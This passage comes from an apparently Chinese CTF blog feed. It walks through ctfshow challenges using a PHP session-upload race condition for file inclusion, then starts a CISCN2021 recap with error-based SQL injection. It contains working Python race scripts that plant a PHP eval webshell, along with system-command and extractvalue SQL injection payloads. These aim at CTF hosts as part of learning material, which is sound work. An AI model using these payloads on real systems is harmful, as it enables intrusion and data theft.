class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;&lt;?php echo ini_get(&quot;</span><span class="hljs-attr">session.upload_progress.name</span>&quot;); ?&gt;</span>&quot; value=&quot;123&quot; /&gt;<br> <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file1&quot;</span> /&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file2&quot;</span> /&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure><p>在session中存放的数据<br><img src="https://img-blog.csdnimg.cn/2021052022111369.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>在<code>session.upload_progress.name=&#39;PHP_SESSION_UPLOAD_PROGRESS&#39;</code>的条件下,上传文件，便会在<code>session[&#39;upload_progress_123&#39;]</code>中储存一些本次上传相关的信息,储存在<code>/tmp/sess_Sn0w</code>中</p><p>Session的默认保存路径<br>在php.ini里的配置session.save_path是注释掉的，那么Seesion保存的路径在不同类型操作系统保存在什么位置？</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">Linux：<br>/tmp 或 /var/lib/php/session<br><br>Windows：<br>C:\WINDOWS\Temp<br></code></pre></td></tr></table></figure><p>在本地phpstudy中找到session的存储位置<br><img src="https://img-blog.csdnimg.cn/20210520220749657.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>理论具体参考：<a href="https://www.yuque.com/u5013914/sn0w/blh341#LbWIR">https://www.yuque.com/u5013914/sn0w/blh341#LbWIR</a></p><p>解题方法1：burpsite条件竞争</p><p>本地html向指定网址上传文件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://f0ea2244-d2b8-43be-8ec6-f61da1585183.chall.ctf.show:8080/&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;123&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;submit&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>bp设置，Cookie里设置<code>PHPSESSID=flag</code>，PHP将会在服务器上创建一个文件：<code>/tmp/sess_flag</code>，利用session.upload_progress写入恶意语句<br><img src="https://img-blog.csdnimg.cn/2021052013092414.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>GET方式访问?file=/tmp/sess_flag<br><img src="https://img-blog.csdnimg.cn/20210520130945799.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>在默认情况下，<code>session.upload_progress.cleanup</code>是开启的，一旦读取了所有POST数据，它就会清除进度信息，利用条件竞争应付这种情况<br><img src="https://img-blog.csdnimg.cn/20210520131009940.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>知道目录文件名为flag.php，修改一句话木马为cat flag.php,继续竞争读取flag<br><img src="https://img-blog.csdnimg.cn/20210520131709942.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>解题方法2：python脚本实现竞争</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># coding=utf-8</span><br>import io<br>import requests<br>import threading<br><br>url = <span class="hljs-string">&#x27;http://352c5d9e-8728-47e3-b3e5-7e8934e06141.node3.buuoj.cn/&#x27;</span><br>sessid = <span class="hljs-string">&#x27;Atkx&#x27;</span><br>data = &#123;<span class="hljs-string">&quot;cmd&quot;</span>: <span class="hljs-string">&quot;system(&#x27;ls&#x27;);&quot;</span>&#125;<br><br><br>def write(session):<br>    <span class="hljs-keyword">while</span> True:<br>        f = io.BytesIO(b<span class="hljs-string">&#x27;a&#x27;</span> * 1024 * 50)<br>        resp = session.post(url,<br>                            data=&#123;<span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="hljs-string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;,<br>                            files=&#123;<span class="hljs-string">&#x27;file&#x27;</span>: (<span class="hljs-string">&#x27;Atkx.txt&#x27;</span>, f)&#125;,<br>                            cookies=&#123;<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>: sessid&#125;)<br><br><br>def <span class="hljs-built_in">read</span>(session):<br>    <span class="hljs-keyword">while</span> True:<br>        resp = session.post(url+<span class="hljs-string">&#x27;?file=/tmp/sess_&#x27;</span> + sessid,<br>                            data=data)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Atkx.txt&#x27;</span> <span class="hljs-keyword">in</span> resp.text:<br>            <span class="hljs-built_in">print</span>(resp.text)<br>            event.clear()<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*]&#x27;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    event = threading.Event()<br>    with requests.session() as session:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(1, 30):<br>            threading.Thread(target=write, args=(session,)).start()<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(1, 30):<br>            threading.Thread(target=<span class="hljs-built_in">read</span>, args=(session,)).start()<br>    event.set()<br></code></pre></td></tr></table></figure><p>读到flag.php<br><img src="https://img-blog.csdnimg.cn/20210520223912589.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>修改一句话木马为cat flag.php，读取flag<br><img src="https://img-blog.csdnimg.cn/20210520224545601.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="ctfhshow-web入门-web82"><a href="#ctfhshow-web入门-web82" class="headerlink" title="ctfhshow [web入门]-web82"></a>ctfhshow [web入门]-web82</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-variable">$file</span> = str_replace(<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = str_replace(<span class="hljs-string">&quot;data&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = str_replace(<span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = str_replace(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>通过观察代码，可以看到过滤了大部分的文件包含函数，这里我们利用PHP_SESSION_UPLOAD_PROGRESS和条件竞争进行文件包含。</p><p>和上面题一样，直接一把梭</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># coding=utf-8</span><br><span class="hljs-comment"># coding=utf-8</span><br>import io<br>import requests<br>import threading<br><br>url = <span class="hljs-string">&#x27;http://4bd1dd58-0b1c-4019-8f55-44ad4dbea031.challenge.ctf.show:8080/&#x27;</span><br>sessid = <span class="hljs-string">&#x27;Atkx&#x27;</span><br>data = &#123;<span class="hljs-string">&quot;cmd&quot;</span>: <span class="hljs-string">&quot;system(&#x27;ls&#x27;);&quot;</span>&#125;<br><br><br>def write(session):<br>    <span class="hljs-keyword">while</span> True:<br>        f = io.BytesIO(b<span class="hljs-string">&#x27;a&#x27;</span> * 1024 * 50)<br>        resp = session.post(url,<br>                            data=&#123;<span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="hljs-string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;,<br>                            files=&#123;<span class="hljs-string">&#x27;file&#x27;</span>: (<span class="hljs-string">&#x27;Atkx.txt&#x27;</span>, f)&#125;,<br>                            cookies=&#123;<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>: sessid&#125;)<br><br><br>def <span class="hljs-built_in">read</span>(session):<br>    <span class="hljs-keyword">while</span> True:<br>        resp = session.post(url+<span class="hljs-string">&#x27;?file=/tmp/sess_&#x27;</span> + sessid,<br>                            data=data)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Atkx.txt&#x27;</span> <span class="hljs-keyword">in</span> resp.text:<br>            <span class="hljs-built_in">print</span>(resp.text)<br>            event.clear()<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*]&#x27;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    event = threading.Event()<br>    with requests.session() as session:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(1, 30):<br>            threading.Thread(target=write, args=(session,)).start()<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(1, 30):<br>            threading.Thread(target=<span class="hljs-built_in">read</span>, args=(session,)).start()<br>    event.set()<br></code></pre></td></tr></table></figure><p>接下来修改代码读取fl0g.php<br><img src="https://img-blog.csdnimg.cn/2021052022574475.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="ctfhshow-web入门-web149"><a href="#ctfhshow-web入门-web149" class="headerlink" title="ctfhshow [web入门]-web149"></a>ctfhshow [web入门]-web149</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$files</span> = scandir(<span class="hljs-string">&#x27;./&#x27;</span>); <br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$files</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>    <span class="hljs-keyword">if</span>(is_file(<span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file</span> !== <span class="hljs-string">&quot;index.php&quot;</span>) &#123;<br>            unlink(<span class="hljs-variable">$file</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br>file_put_contents(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>], <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;show&#x27;</span>]);<br><br><span class="hljs-variable">$files</span> = scandir(<span class="hljs-string">&#x27;./&#x27;</span>); <br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$files</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>    <span class="hljs-keyword">if</span>(is_file(<span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file</span> !== <span class="hljs-string">&quot;index.php&quot;</span>) &#123;<br>            unlink(<span class="hljs-variable">$file</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>使用bp不断访问并传参，然后开一个去不断访问 1.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">ctf=<span class="hljs-number">1.</span>php<br>show=<span class="hljs-meta">&lt;?php</span> system(<span class="hljs-string">&#x27;tac /c*&#x27;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>利用脚本实现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> threading<br><br>url = <span class="hljs-string">&quot;http://ae3929ad-8f8f-4dc5-88c9-511d15e5625d.chall.ctf.show:8080/&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">write</span>():</span><br>    <span class="hljs-keyword">while</span> event.isSet():<br>        data = &#123;<br>            <span class="hljs-string">&#x27;show&#x27;</span>:<span class="hljs-string">&#x27;&lt;?php system(&quot;ls /&quot;);?&gt;&#x27;</span><br>        &#125;<br>        W_reponse = requests.post(url+<span class="hljs-string">&quot;?ctf=1.php&quot;</span>,data=data)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">read</span>():</span><br>    <span class="hljs-keyword">while</span> event.isSet():<br>        R_reponse = requests.get(url+<span class="hljs-string">&quot;1.php&quot;</span>)<br>        <span class="hljs-keyword">if</span> R_reponse.status_code != <span class="hljs-number">404</span>:<br>            print(R_reponse.text)<br>            event.clear()<br>        <span class="hljs-keyword">else</span>:<br>            print(<span class="hljs-string">&#x27;[*]continued&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-comment"># 通过threading.Event()可以创建一个事件管理标志，该标志（event）默认为False</span><br>    event = threading.Event()<br>    <span class="hljs-comment"># 将event的标志设置为True，调用wait方法的所有线程将被唤醒；</span><br>    event.<span class="hljs-built_in">set</span>()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>):<br>        threading.Thread(target=write).start()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>):<br>        threading.Thread(target=read).start()<br></code></pre></td></tr></table></figure><p>跑脚本，发现了ctfshow_fl0g_here.txt文件<br><img src="https://img-blog.csdnimg.cn/20210425193008262.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>修改为cat /ctfshow_fl0g_here.txt继续跑脚本，即可得到flag<br><img src="https://img-blog.csdnimg.cn/20210425193100247.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
    
    
      
      
    <summary type="html"> &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;

&lt;h2 id=&quot;0x00-条件竞争&quot;&gt;&lt;a href=&quot;#0x00-条件竞争&quot; class=&quot;headerlink&quot; title=&quot;0x00-条件竞争&quot;&gt;&lt;/a&gt;0x00-条件竞争&lt;/h2&gt;&lt;p&gt;条件竞争漏洞是一种服务器端的漏洞，由于服务器</summary>
      
    
    
    
    <category term="CTF" scheme="http://atkx.top/categories/CTF/"/>
    
    <category term="WEB" scheme="http://atkx.top/categories/CTF/WEB/"/>
    
    
    <category term="漏洞" scheme="http://atkx.top/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>CISCN2021赛后复现</title>
    <link href="http://atkx.top/2021/05/21/CISCN2021%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://atkx.top/2021/05/21/CISCN2021%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0/</id>
    <published>2021-05-21T14:26:42.000Z</published>
    <updated>2021-08-15T03:59:06.416Z</updated>
    
    <content type="html"><![CDATA[ <a id="more"></a><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="esay-sql"><a href="#esay-sql" class="headerlink" title="esay_sql"></a>esay_sql</h2><p>输入单引号报错</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">uname=admin&amp;passwd=<span class="hljs-number">123456</span><span class="hljs-string">&#x27;&amp;Submit=%E7%99%BB%E5%BD%95</span><br><span class="hljs-string"></span><br><span class="hljs-string">#You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#x27;</span><span class="hljs-string">&#x27;123456&#x27;</span><span class="hljs-string">&#x27;) LIMIT 0,1&#x27;</span> at line <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/4903b7830329ec519a9add06ecbd160d.png" alt="image-20210515182436750"><br>sqlmap跑了一下，可以使用报错注入</p><p>1.爆库名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">uname=admin&amp;passwd=<span class="hljs-number">123456</span><span class="hljs-string">&#x27;)and extractvalue(1,concat(0x7e,database(),0x7e))--+&amp;Submit=%E7%99%BB%E5%BD%95</span><br><span class="hljs-string"></span><br><span class="hljs-string">#XPATH syntax error: &#x27;</span>~security~<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><p>2.爆表名</p><p>猜测表名为flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">uname=admin&amp;passwd=<span class="hljs-number">123456</span><span class="hljs-string">&#x27;)and extractvalue(1,concat(0x7e,(select * from flag),0x7e))--+&amp;Submit=%E7%99%BB%E5%BD%95</span><br><span class="hljs-string"></span><br><span class="hljs-string">#Operand should contain 1 column(s)</span><br></code></pre></td></tr></table></figure><p>3.爆列名</p><p>过滤了information_schema函数，可以使用join 无列名注入</p><p>得到id列</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">uname=admin&amp;passwd=<span class="hljs-number">123456</span><span class="hljs-string">&#x27;)and extractvalue(1,concat(0x7e,(select * from (select * from flag a join flag )b),0x7e))--+&amp;Submit=%E7%99%BB%E5%BD%95</span><br><span class="hljs-string"></span><br><span class="hljs-string">#Duplicate column name &#x27;</span>id<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><p>得到no列</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">uname=admin&amp;passwd=<span class="hljs-number">123456</span><span class="hljs-string">&#x27;)and extractvalue(1,concat(0x7e,(select * from (select * from flag join flag as a using(id))b),0x7e))--+&amp;Submit=%E7%99%BB%E5%BD%95</span><br><span class="hljs-string"></span><br><span class="hljs-string">#Duplicate column name &#x27;</span>no<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><p>得到ea1235fa-d397-474b-8188-dedbe352ffc7列</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">uname=admin&amp;passwd=<span class="hljs-number">123456</span><span class="hljs-string">&#x27;)and extractvalue(1,concat(0x7e,(select * from (select * from flag join flag as a using(id,no))b),0x7e))--+&amp;Submit=%E7%99%BB%E5%BD%95</span><br><span class="hljs-string"></span><br><span class="hljs-string">#Duplicate column name &#x27;</span>ea1235fa-d397<span class="hljs-number">-474</span>b<span class="hljs-number">-8188</span>-dedbe352ffc7<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><p>4.爆值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">uname=admin&amp;passwd=<span class="hljs-number">123456</span><span class="hljs-string">&#x27;)and extractvalue(1,concat(0x7e,(select `ea1235fa-d397-474b-8188-dedbe352ffc7` from flag),0x7e))--+&amp;Submit=%E7%99%BB%E5%BD%95</span><br><span class="hljs-string"></span><br><span class="hljs-string">#XPATH syntax error: &#x27;</span>~CISCN&#123;tJ1mc-jgoXW-qiG07-oHt4u-s<br></code></pre></td></tr></table></figure><p>因为报错注入限制只能读取一半flag，用right读取右半部分</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">uname=admin&amp;passwd=<span class="hljs-number">123456</span><span class="hljs-string">&#x27;)and extractvalue(1,concat(0x7e,right((select `ea1235fa-d397-474b-8188-dedbe352ffc7` from flag),20),0x7e))--+&amp;Submit=%E7%99%BB%E5%BD%95</span><br><span class="hljs-string"></span><br><span class="hljs-string">#XPATH syntax error: &#x27;</span>~-qiG07-oHt4u-shqSb-&#125;~<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/b33f074e5d8a9425d7463e89e4510ba4.png" alt="image-20210515184620854"><br>消去重复部分，最终flag为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">CISCN&#123;tJ1mc-jgoXW-qiG07-oHt4u-shqSb-&#125;<br></code></pre></td></tr></table></figure><h2 id="easy-source"><a href="#easy-source" class="headerlink" title="easy_source"></a>easy_source</h2><p>一道原题，参考<a href="https://r0yanx.com/2020/10/28/fslh-writeup/">wp</a>复现的<br>题目描述：你知道开发一个php程序很重要的东西是什么吗（flag在你看不到的地方）</p><p>最重要的就是备份，访问.index.php.swo得到源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span 